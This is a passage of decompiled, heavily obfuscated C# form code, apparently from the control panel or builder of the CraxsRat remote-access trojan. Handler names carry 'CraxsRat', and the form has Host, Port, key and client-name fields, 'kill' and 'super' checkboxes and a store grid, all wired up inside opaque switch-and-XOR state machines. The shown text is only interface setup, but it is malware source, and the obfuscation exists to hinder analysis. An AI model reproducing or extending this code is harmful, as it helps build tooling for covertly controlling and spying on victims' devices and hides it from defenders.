            this.DrakeUIButtonIcon1.Font = new Font(EXGuarder.\u0034C5F3E79, 9f);
            this.DrakeUIButtonIcon1.Location = new Point(271, 7);
            this.DrakeUIButtonIcon1.Margin = new Padding(4);
            num1 = (int) num3 * 784933441 ^ -56081639;
            continue;
          case 522:
            this.ComboPrims.Location = new Point(921, 271);
            num1 = (int) num3 * 538723554 ^ -1977273685;
            continue;
          case 523:
            ((ISupportInitialize) this.PictureBox1).EndInit();
            num1 = (int) num3 * -2112013911 ^ 201182420;
            continue;
          case 524:
            this.b_ok = new DrakeUIButtonIcon();
            num1 = (int) num3 * -1223163632 ^ -1792250208;
            continue;
          case 525:
            this.Panel1.Controls.Add((Control) this.Label1);
            this.Panel1.Controls.Add((Control) this.DrakeUIImageButton1);
            this.Panel1.Controls.Add((Control) this.DrakeUIButtonIcon13);
            this.Panel1.Controls.Add((Control) this.DrakeUIButtonIcon12);
            num1 = (int) num3 * 1965596365 ^ -1706519789;
            continue;
          case 526:
            this.ToolTips = new DrakeUIToolTip(this.components);
            num1 = (int) num3 * 1467992628 ^ 387165011;
            continue;
          case 527:
            ((ISupportInitialize) this.logopic).EndInit();
            this.mainpanel.ResumeLayout(false);
            num1 = (int) num3 * -321317643 ^ 1586678132;
            continue;
          case 528:
            this.Label15.TextAlign = ContentAlignment.BottomCenter;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num3 * -1399236035 ^ 1359591295;
            continue;
          case 529:
            this.DrakeUIAvatar5.Size = new Size(36, 28);
            this.DrakeUIAvatar5.Style = UIStyle.Custom;
            this.DrakeUIAvatar5.Symbol = 61529;
            num1 = (int) num3 * -1328329997 ^ 2057720227;
            continue;
          case 530:
            this.lockpanel.Size = new Size(1184, 780);
            num1 = (int) num3 * 160092380 ^ 1550931307;
            continue;
          case 531:
            this.Label2 = new Label();
            num1 = (int) num3 * -1437410247 ^ 296112354;
            continue;
          case 532:
            this.Label3.Size = new Size(47, 29);
            num1 = (int) num3 * -1342038903 ^ -995595831;
            continue;
          case 533:
            this.Label17.ForeColor = Color.White;
            num1 = (int) num3 * 1749753889 ^ -863951633;
            continue;
          case 534:
            this.Port.Style = UIStyle.Custom;
            num1 = (int) num3 * -1314882 ^ -909629596;
            continue;
          case 535:
            this.b_ok.Style = UIStyle.Custom;
            this.b_ok.TabIndex = 30;
            num1 = (int) num3 * -1871687601 ^ -914445992;
            continue;
          case 536:
            this.TheKey.Padding = new Padding(5);
            this.TheKey.Radius = 15;
            this.TheKey.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.TheKey.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.TheKey.Size = new Size(228, 30);
            num1 = (int) num3 * 1582053288 ^ -1330038845;
            continue;
          case 537:
            this.ComboPrims.BackColor = Color.Black;
            this.ComboPrims.DropDownStyle = ComboBoxStyle.DropDownList;
            num1 = (int) num3 * -1527094593 ^ -1676399001;
            continue;
          case 538:
            this.TabPage1.Controls.Add((Control) this.Label3);
            this.TabPage1.Controls.Add((Control) this.Label7);
            num1 = (int) num3 * -792098181 ^ 1282248441;
            continue;
          case 539:
            this.Label2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label2.Location = new Point(1013, 84);
            num1 = (int) num3 * 887874607 ^ -254389044;
            continue;
          case 540:
            this.statustext.Dock = DockStyle.Bottom;
            num1 = (int) num3 * -702870669 ^ -29195929;
            continue;
          case 541:
            this.sel.ReadOnly = true;
            this.TabPage1.BackColor = Color.Black;
            num1 = (int) num3 * 1838872693 ^ 20568588;
            continue;
          case 542:
            this.DrakeUIButtonIcon13.Location = new Point(1073, 7);
            this.DrakeUIButtonIcon13.Margin = new Padding(4);
            num1 = (int) num3 * 493402034 ^ 1449914655;
            continue;
          case 543:
            this.strpasstext.Size = new Size(568, 24);
            this.strpasstext.Style = UIStyle.Custom;
            this.strpasstext.TabIndex = 32;
            this.strpasstext.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * 822994766 ^ 1851880237;
            continue;
          case 544:
            this.CLiname.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.CLiname.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.CLiname.Size = new Size(228, 30);
            num1 = (int) num3 * -757034849 ^ -2144190829;
            continue;
          case 545:
            this.Label9.TabIndex = 50;
            this.Label9.Tag = (object) EXGuarder.\u00311734B49;
            num1 = (int) num3 * 2144941348 ^ 1405263885;
            continue;
          case 546:
            this.TheKey = new DrakeUITextBox();
            this.Port = new DrakeUITextBox();
            num1 = (int) num3 * 1671110409 ^ -722680570;
            continue;
          case 547:
            this.DrakeUIButtonIcon5.Size = new Size(321, 121);
            num1 = (int) num3 * 1415687067 ^ -75774149;
            continue;
          case 548:
            this.DrakeUIButtonIcon12.Font = new Font(EXGuarder.\u0034C5F3E79, 9f);
            this.DrakeUIButtonIcon12.Location = new Point(1126, 7);
            this.DrakeUIButtonIcon12.Margin = new Padding(4);
            num1 = (int) num3 * 1556388202 ^ 663333953;
            continue;
          case 549:
            this.DrakeUIButtonIcon5 = new DrakeUIButtonIcon();
            num1 = (int) num3 * 662576249 ^ -1687802114;
            continue;
          case 550:
            this.DrakeUIButtonIcon5.FillColor = Color.Black;
            num1 = (int) num3 * 1223927416 ^ -1042108352;
            continue;
          case 551:
            this.Label10.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label10.Location = new Point(846, 462);
            this.Label10.Name = EXGuarder.\u0036F790229;
            num1 = (int) num3 * -1799267962 ^ 1957707383;
            continue;
          case 552:
            this.DrakeUITabControl1.Controls.Add((Control) this.TabPage1);
            this.DrakeUITabControl1.Controls.Add((Control) this.TabPage4);
            num1 = (int) num3 * -1228876952 ^ -1485504175;
            continue;
          case 553:
            ((ISupportInitialize) this.DGVSTORE).EndInit();
            num1 = (int) num3 * 1239119165 ^ 293796878;
            continue;
          case 554:
            this.DrakeUIButtonIcon1.Size = new Size(45, 42);
            num1 = (int) num3 * 377592821 ^ 590628486;
            continue;
          case 555:
            this.checkDraw.Size = new Size(61, 29);
            this.checkDraw.TabIndex = 53;
            this.checkautoclick.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num3 * 398330896 ^ 1630165339;
            continue;
          case 556:
            this.DrakeUIButtonIcon13.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1415331431 ^ -106028243;
            continue;
          case 557:
            this.DrakeUIButtonIcon1.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -965160724 ^ -1915445260;
            continue;
          case 558:
            this.Label4.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 1156001774 ^ 1401365353;
            continue;
          case 559:
            this.DrakeUIButtonIcon3.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1254707243 ^ 407988947;
            continue;
          case 560:
            this.Label12 = new Label();
            this.Label11 = new Label();
            this.msgtext = new DrakeUITextBox();
            num1 = (int) num3 * 1616593682 ^ 696532164;
            continue;
          case 561:
            this.b_ok.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1790945730 ^ 1703235106;
            continue;
          case 562:
            this.Label9.Name = EXGuarder.\u0032350215D;
            num1 = (int) num3 * -221203504 ^ 1036972344;
            continue;
          case 563:
            this.TabPage1.Controls.Add((Control) this.Label12);
            this.TabPage1.Controls.Add((Control) this.Label11);
            this.TabPage1.Controls.Add((Control) this.msgtext);
            this.TabPage1.Controls.Add((Control) this.Label10);
            num1 = (int) num3 * -201783776 ^ -769130882;
            continue;
          case 564:
            this.downprogress.Location = new Point(0, 661);
            num1 = (int) num3 * 1300980083 ^ 1754163704;
            continue;
          case 565:
            this.CLiname.Style = UIStyle.Custom;
            this.CLiname.StyleCustomMode = true;
            num1 = (int) num3 * 1830918297 ^ 1507130622;
            continue;
          case 566:
            this.Label16.Size = new Size(593, 59);
            num1 = (int) num3 * -547320215 ^ 79826461;
            continue;
          case 567:
            this.showworkbtn = new DrakeUIAvatar();
            num1 = (int) num3 * -1796552389 ^ -1832459426;
            continue;
          case 568:
            this.DrakeUIButtonIcon5.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon5.TabIndex = 31;
            this.DrakeUIButtonIcon5.Text = EXGuarder.\u0032E3B7567;
            num1 = (int) num3 * 1317430970 ^ -617439407;
            continue;
          case 569:
            this.checkDraw.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1214739585 ^ -583240493;
            continue;
          case 570:
            this.Label16.Font = new Font(EXGuarder.\u003715A3F2E, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 420759372 ^ 552912354;
            continue;
          case 571:
            this.Label1.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num3 * -413210183 ^ -1329136642;
            continue;
          case 572:
            this.statustext.Text = EXGuarder.\u0033A2D0761;
            num1 = (int) num3 * -831909046 ^ -1308277333;
            continue;
          case 573:
            this.TabPage1.ResumeLayout(false);
            num1 = (int) num3 * 534780257 ^ 111984528;
            continue;
          case 574:
            this.DrakeUIButtonIcon1.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon1.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1485291195 ^ -135512783;
            continue;
          case 575:
            this.worklog.Dock = DockStyle.Bottom;
            this.worklog.FillColor = Color.Black;
            this.worklog.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -188382974 ^ -1479487383;
            continue;
          case 576:
            this.downprogress.Name = EXGuarder.\u00302580B2A;
            num1 = (int) num3 * -577900303 ^ 1562346690;
            continue;
          case 577:
            this.sel = new DataGridViewCheckBoxColumn();
            num1 = (int) num3 * 749742813 ^ 834476984;
            continue;
          case 578:
            this.workpanel.Size = new Size(1184, 684);
            this.workpanel.TabIndex = 3;
            this.DrakeUIButtonIcon2.Cursor = Cursors.Hand;
            num1 = (int) num3 * -640273850 ^ 1251391027;
            continue;
          case 579:
            this.DrakeUIButtonIcon12.Radius = 25;
            this.DrakeUIButtonIcon12.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon12.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.DrakeUIButtonIcon12.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon12.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 109273526 ^ -1201626020;
            continue;
          case 580:
            this.checkkill.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * -1951151889 ^ 1882077667;
            continue;
          case 581:
            this.mainpanel.Size = new Size(1184, 780);
            num1 = (int) num3 * -1497423683 ^ -1674796084;
            continue;
          case 582:
            this.TabPage2.Controls.Add((Control) this.DGVSTORE);
            num1 = (int) num3 * 1216668229 ^ -1872460527;
            continue;
          case 583:
            this.Label7 = new Label();
            num1 = (int) num3 * 1910658909 ^ -1278768395;
            continue;
          case 584:
            this.DrakeUIButtonIcon5.RectColor = Color.FromArgb((int) sbyte.MaxValue, 5, 1);
            num1 = (int) num3 * -2039669026 ^ -1463834781;
            continue;
          case 585:
            this.DrakeUITabControl1.Location = new Point(0, 56);
            this.DrakeUITabControl1.MenuStyle = UIMenuStyle.Custom;
            num1 = (int) num3 * -1376716307 ^ 1361936346;
            continue;
          case 586:
            this.Host.FillColor = Color.Black;
            this.Host.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.Host.ForeColor = Color.White;
            this.Host.Location = new Point(630, 118);
            num1 = (int) num3 * 1987589423 ^ -1731596932;
            continue;
          case 587:
            this.DrakeUIButtonIcon1.Symbol = 57353;
            num1 = (int) num3 * 1240910233 ^ 2096071806;
            continue;
          case 588:
            this.checksuper.TabIndex = 51;
            num1 = (int) num3 * 740753010 ^ 572776234;
            continue;
          case 589:
            this.worklog.Multiline = true;
            this.worklog.Name = EXGuarder.\u003655C032A;
            num1 = (int) num3 * -790634648 ^ 317358091;
            continue;
          case 590:
            this.Label17.TabIndex = 33;
            this.Label17.Text = EXGuarder.\u00301396240;
            num1 = (int) num3 * -193454806 ^ 1657817650;
            continue;
          case 591:
            this.downprogress.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -2133313807 ^ 410350768;
            continue;
          case 592:
            this.DrakeUIButtonIcon12.SymbolSize = 25;
            num1 = (int) num3 * 1382047780 ^ -1497132537;
            continue;
          case 593:
            this.checkkill.Size = new Size(61, 29);
            this.checkkill.TabIndex = 54;
            this.checkDraw.CheckBoxColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num3 * -1650590031 ^ -1280250858;
            continue;
          case 594:
            this.showworkbtn.Name = EXGuarder.\u00317616E14;
            num1 = (int) num3 * 393524569 ^ 404489566;
            continue;
          case 595:
            this.DGVSTORE.BorderStyle = BorderStyle.None;
            num1 = (int) num3 * 1215400322 ^ -1513097241;
            continue;
          case 596:
            this.Label5.Cursor = Cursors.Default;
            this.Label5.FlatStyle = FlatStyle.Flat;
            num1 = (int) num3 * 1030169608 ^ -1676676895;
            continue;
          case 597:
            this.Label3.AutoSize = true;
            num1 = (int) num3 * -1368525466 ^ 1897736162;
            continue;
          case 598:
            this.CLiname = new DrakeUITextBox();
            this.TabPage4 = new TabPage();
            this.workpanel = new Panel();
            num1 = (int) num3 * -1854645133 ^ -515186270;
            continue;
          case 599:
            this.DrakeUIButtonIcon13.RectPressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 2126048666 ^ 636703826;
            continue;
          case 600:
            this.Label2.Text = EXGuarder.\u0035F22734D;
            num1 = (int) num3 * 1730809782 ^ -454560637;
            continue;
          case 601:
            this.worklog.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -942588614 ^ 1414145398;
            continue;
          case 602:
            this.b_ok.Name = EXGuarder.\u0033560482F;
            this.b_ok.Radius = 25;
            num1 = (int) num3 * -42096293 ^ 1985487499;
            continue;
          case 603:
            this.TabPage4.ResumeLayout(false);
            num1 = (int) num3 * -852962197 ^ -1096838077;
            continue;
          case 604:
            this.Label6.FlatStyle = FlatStyle.Flat;
            num1 = (int) num3 * -1192418729 ^ -988123094;
            continue;
          case 605:
            this.workimage.Name = EXGuarder.\u00322397049;
            num1 = (int) num3 * 771693594 ^ -968733019;
            continue;
          case 606:
            this.DGVSTORE.RowHeadersVisible = false;
            num1 = (int) num3 * 1507823460 ^ -1052712835;
            continue;
          case 607:
            this.TabPage1.Controls.Add((Control) this.ComboPrims);
            num1 = (int) num3 * 610292795 ^ -1658377455;
            continue;
          default:
            goto label_609;
        }
      }
label_609:
      this.ResumeLayout(false);
    }

    [field: AccessedThroughProperty("logopic")]
    internal virtual PictureBox logopic { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("statustext")]
    internal virtual Label statustext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
label_1:
        int num1 = 51481343;
        while (true)
        {
          int num2 = num1;
          uint num3;
          System.Windows.Forms.Timer timer1;
          switch ((num3 = (uint) (-((~~1478078394 + ~(-1985844712 - -354317410 - 2058923074) * -2038997651 - num2 ^ ~(47322466 + 1171412842) ^ 1524128731 * (-897790834 - 246494717) ^ -1483978767 - -1991889229) * -1131924131 - ~1168242241) ^ 831627512)) % 7U)
          {
            case 0:
              timer1.Tick -= eventHandler;
              num1 = (int) num3 * 878953477 ^ 1890618947;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              timer1.Tick += eventHandler;
              num1 = (int) num3 * 1682517302 ^ 1557367946;
              continue;
            case 4:
              this._Timer1 = value;
              timer1 = this._Timer1;
              int num4;
              num1 = num4 = timer1 == null ? 301250742 : (num4 = -850577077);
              continue;
            case 5:
              int num5 = timer1 == null ? 1674291107 : (num5 = 1356666571);
              num1 = num5 ^ (int) num3 * -1552260563;
              continue;
            case 6:
              timer1 = this._Timer1;
              num1 = (int) num3 * -1592549990 ^ 1490668692;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("mainpanel")]
    internal virtual Panel mainpanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon12
    {
      get => this._DrakeUIButtonIcon12;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon12_Click);
label_1:
        int num1 = 1891807446;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DrakeUIButtonIcon drakeUiButtonIcon12;
          switch ((num3 = (uint) (-((~(547493720 ^ -562051250) + ((132350584 + 1732666577 ^ -1279865448) - (~1210221176 ^ -1220558510)) - (num2 - -1747936461 * (-1868722402 + (-1902974778 - 355029597 ^ 1392019279 * (213609248 * -1815409925))))) * 847823387) - (-2145757599 ^ 1832009555))) % 7U)
          {
            case 0:
              this._DrakeUIButtonIcon12 = value;
              drakeUiButtonIcon12 = this._DrakeUIButtonIcon12;
              num1 = 1734677252;
              continue;
            case 1:
              drakeUiButtonIcon12 = this._DrakeUIButtonIcon12;
              int num4 = drakeUiButtonIcon12 == null ? -1253174211 : (num4 = -592878335);
              num1 = num4 ^ (int) num3 * -1679949884;
              continue;
            case 2:
              int num5 = drakeUiButtonIcon12 == null ? 1110260981 : (num5 = 627399229);
              num1 = num5 ^ (int) num3 * -971102510;
              continue;
            case 3:
              drakeUiButtonIcon12.Click -= eventHandler;
              num1 = (int) num3 * 1781519694 ^ 421183807;
              continue;
            case 4:
              drakeUiButtonIcon12.Click += eventHandler;
              num1 = (int) num3 * 933404619 ^ 299343200;
              continue;
            case 5:
              goto label_3;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel1
    {
      get => this._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.Panel1_MouseDown);
label_1:
        int num1 = 593886648;
        Panel panel1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~(-(num1 * -31195455) - (~(2042947835 ^ 2110743305) ^ ---1875026879)) + -155031443)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = panel1 == null ? 1587472801 : (num3 = -859491322);
              num1 = num3 ^ (int) num2 * -1700889590;
              continue;
            case 2:
              goto label_3;
            case 3:
              panel1.MouseDown -= mouseEventHandler;
              num1 = (int) num2 * 146786272 ^ 56063323;
              continue;
            case 4:
              this._Panel1 = value;
              panel1 = this._Panel1;
              num1 = 1849858290;
              continue;
            case 5:
              int num4 = panel1 == null ? 1533137465 : (num4 = 685964821);
              num1 = num4 ^ (int) num2 * -362843700;
              continue;
            case 6:
              panel1.MouseDown += mouseEventHandler;
              num1 = (int) num2 * 1771246876 ^ -1249515827;
              continue;
            case 7:
              panel1 = this._Panel1;
              num1 = (int) num2 * -1337816553 ^ -437471129;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon13
    {
      get => this._DrakeUIButtonIcon13;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon13_Click);
        DrakeUIButtonIcon drakeUiButtonIcon13 = this._DrakeUIButtonIcon13;
label_1:
        int num1 = 1785961657;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~(((num1 - (--(-341198743 + -1296639615 * -814285386) + (~(-241208068 ^ -1603347688 ^ 1767298319 - -891219658) - (402222589 - (1444361871 - -1345909897) ^ 1160250275 * (-1749791181 * 869663263))))) * 136548199 ^ ~~(-1763684753 * 675975789)) - 1350077400)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              this._DrakeUIButtonIcon13 = value;
              drakeUiButtonIcon13 = this._DrakeUIButtonIcon13;
              num1 = 1886694522;
              continue;
            case 2:
              drakeUiButtonIcon13.Click -= eventHandler;
              num1 = (int) num2 * -955500839 ^ 1378694351;
              continue;
            case 3:
              int num3 = drakeUiButtonIcon13 == null ? -1483825701 : (num3 = -1692272269);
              num1 = num3 ^ (int) num2 * -1395584121;
              continue;
            case 4:
              int num4 = drakeUiButtonIcon13 == null ? -1857878458 : (num4 = -652229769);
              num1 = num4 ^ (int) num2 * 482627262;
              continue;
            case 5:
              goto label_1;
            case 6:
              drakeUiButtonIcon13.Click += eventHandler;
              num1 = (int) num2 * -1322517078 ^ 1008510016;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("DrakeUITabControl1")]
    internal virtual DrakeUITabControl DrakeUITabControl1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TabPage1")]
    internal virtual TabPage TabPage1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TabPage2")]
    internal virtual TabPage TabPage2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("DrakeUIImageButton1")]
    internal virtual DrakeUIImageButton DrakeUIImageButton1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label3")]
    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label7")]
    internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label4")]
    internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Host")]
    internal virtual DrakeUITextBox Host { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TheKey")]
    internal virtual DrakeUITextBox TheKey { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Port")]
    internal virtual DrakeUITextBox Port { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("CLiname")]
    internal virtual DrakeUITextBox CLiname { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("DrakeUIAvatar5")]
    internal virtual DrakeUIAvatar DrakeUIAvatar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label12")]
    internal virtual Label Label12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label11")]
    internal virtual Label Label11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("msgtext")]
    internal virtual DrakeUITextBox msgtext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label10")]
    internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("titletext")]
    internal virtual DrakeUITextBox titletext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label6")]
    internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label5")]
    internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label8")]
    internal virtual Label Label8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label14")]
    internal virtual Label Label14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label9")]
    internal virtual Label Label9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DataGridView DGVSTORE
    {
      get => this._DGVSTORE;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DataGridViewCellEventHandler cellEventHandler = new DataGridViewCellEventHandler(this.DGVSTORE_CellClick);
label_1:
        int num1 = -500912667;
        while (true)
        {
          int num2 = num1;
          uint num3;
          DataGridView dgvstore;
          switch ((num3 = (uint) (~-914990158 - -(-(num2 * -83163725) * 524447245) ^ 919656083)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              dgvstore.CellClick -= cellEventHandler;
              num1 = (int) num3 * 2018672099 ^ -433146037;
              continue;
            case 2:
              dgvstore.CellClick += cellEventHandler;
              num1 = (int) num3 * -1550243539 ^ -706170460;
              continue;
            case 3:
              dgvstore = this._DGVSTORE;
              num1 = (int) num3 * -1752898664 ^ 833718186;
              continue;
            case 4:
              this._DGVSTORE = value;
              dgvstore = this._DGVSTORE;
              int num4;
              num1 = num4 = dgvstore == null ? 1802405743 : (num4 = 957200607);
              continue;
            case 5:
              goto label_3;
            case 6:
              int num5 = dgvstore == null ? -1862522275 : (num5 = -1777408988);
              num1 = num5 ^ (int) num3 * -2119519666;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual BackgroundWorker loadworker
    {
      get => this._loadworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsascewfvwgfgh);
        BackgroundWorker loadworker = this._loadworker;
        if (loadworker == null)
          goto label_5;
label_1:
        int num1 = 326179240;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 ^ -((1610603247 - 204866222 ^ ~35817238 ^ -~1202315773) - (-1464625649 * -1373906888 - (-488527242 + (1362626155 - -1194296161)))) ^ 174981820 + (1693721201 ^ 1009573475 * 897765226) + ~134707484 * -727389447 * -1274480789)) % 7U)
          {
            case 0:
              int num3 = loadworker == null ? 1887518197 : (num3 = 1863625401);
              num1 = num3 ^ (int) num2 * 1392320437;
              continue;
            case 1:
              loadworker.DoWork += workEventHandler;
              num1 = (int) num2 * 1000722421 ^ 1058281515;
              continue;
            case 2:
              loadworker.DoWork -= workEventHandler;
              num1 = (int) num2 * -2036464779 ^ 1508943900;
              continue;
            case 3:
              goto label_1;
            case 4:
              loadworker = this._loadworker;
              num1 = (int) num2 * 724785401 ^ 1778058449;
              continue;
            case 5:
              goto label_5;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        this._loadworker = value;
        num1 = 760201746;
        goto label_2;
      }
    }

    [field: AccessedThroughProperty("Panelhome")]
    internal virtual Panel Panelhome { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon exitbtn
    {
      get => this._exitbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Exitbtn_Click);
        DrakeUIButtonIcon exitbtn = this._exitbtn;
label_1:
        int num1 = -882959717;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 * -593858081 * -957901437 * -87689175 * -1296848165)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = exitbtn == null ? 1995695730 : (num3 = 1653926481);
              num1 = num3 ^ (int) num2 * 1422312404;
              continue;
            case 2:
              goto label_3;
            case 3:
              exitbtn.Click += eventHandler;
              num1 = (int) num2 * -382694755 ^ -777154383;
              continue;
            case 4:
              this._exitbtn = value;
              num1 = -383189438;
              continue;
            case 5:
              int num4 = exitbtn == null ? 1014289641 : (num4 = -1809597804);
              num1 = num4 ^ (int) num2 * -1125743119;
              continue;
            case 6:
              exitbtn = this._exitbtn;
              num1 = (int) num2 * 547993244 ^ -789744737;
              continue;
            case 7:
              exitbtn.Click -= eventHandler;
              num1 = (int) num2 * -1600014144 ^ -1521089180;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    [field: AccessedThroughProperty("reqbtn")]
    internal virtual DrakeUIButtonIcon reqbtn { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon storebtn
    {
      get => this._storebtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Storebtn_Click);
        DrakeUIButtonIcon storebtn = this._storebtn;
label_1:
        int num1 = -966778562;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~-(num1 - ~((~10043050 ^ 110091955 - -1225998239) - 881792720 ^ 1658958854 - 1525250132 - -1793369203 * 1251878685 + ~~-1442829139))) % 8U)
          {
            case 0:
              storebtn.Click += eventHandler;
              num1 = (int) num2 * 1085943731 ^ 659872442;
              continue;
            case 1:
              int num3 = storebtn == null ? 1970306084 : (num3 = -1347705601);
              num1 = num3 ^ (int) num2 * 111882223;
              continue;
            case 2:
              storebtn = this._storebtn;
              num1 = (int) num2 * -1714844864 ^ 1595534588;
              continue;
            case 3:
              int num4 = storebtn == null ? -665030284 : (num4 = -75771807);
              num1 = num4 ^ (int) num2 * -2141943926;
              continue;
            case 4:
              this._storebtn = value;
              num1 = -1905402643;
              continue;
            case 5:
              goto label_3;
            case 6:
              goto label_1;
            case 7:
              storebtn.Click -= eventHandler;
